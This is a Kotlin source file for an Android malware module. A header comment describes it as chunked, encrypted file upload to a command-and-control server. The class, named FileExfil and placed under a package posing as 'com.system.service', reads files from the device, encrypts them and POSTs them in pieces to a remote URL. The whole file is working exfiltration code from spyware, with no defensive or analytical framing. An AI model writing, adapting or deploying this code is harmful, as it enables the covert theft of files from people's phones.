// [context: Kotlin, Android API 26+, chunk + encrypt file upload to C2]
package com.system.service.modules.files

import android.content.Context
import com.system.service.crypto.DataEncryptor
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File

class FileExfil(private val context: Context, private val uploadUrl: String) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient()
    private val CHUNK_SIZE = 512 * 1024  // 512KB

    fun exfil(file: File, onDone: (Boolean) -> Unit) {
        scope.launch {
            try {
                val bytes = file.readBytes()
                val encrypted = DataEncryptor.encryptAndCompress(bytes)
                val chunks = encrypted.toList().chunked(CHUNK_SIZE)

                for ((i, chunk) in chunks.withIndex()) {
                    val body = chunk.toByteArray().toRequestBody("application/octet-stream".toMediaType())
                    val req = Request.Builder()
                        .url("$uploadUrl?name=${file.name}&chunk=$i&total=${chunks.size}")
                        .post(body)
                        .build()
                    val resp = client.newCall(req).execute()
                    if (!resp.isSuccessful) { onDone(false); return@launch }
                    resp.close()
                }
                onDone(true)
            } catch (_: Exception) { onDone(false) }
        }
    }
}
